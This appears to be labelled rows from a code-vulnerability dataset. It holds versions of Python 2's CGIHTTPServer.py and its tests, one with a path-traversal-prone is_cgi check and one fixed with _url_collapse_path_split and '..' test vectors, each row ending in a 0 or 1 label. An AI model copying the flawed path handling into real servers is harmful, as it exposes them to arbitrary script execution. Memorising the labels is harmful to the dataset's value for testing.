            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
20,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
21,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
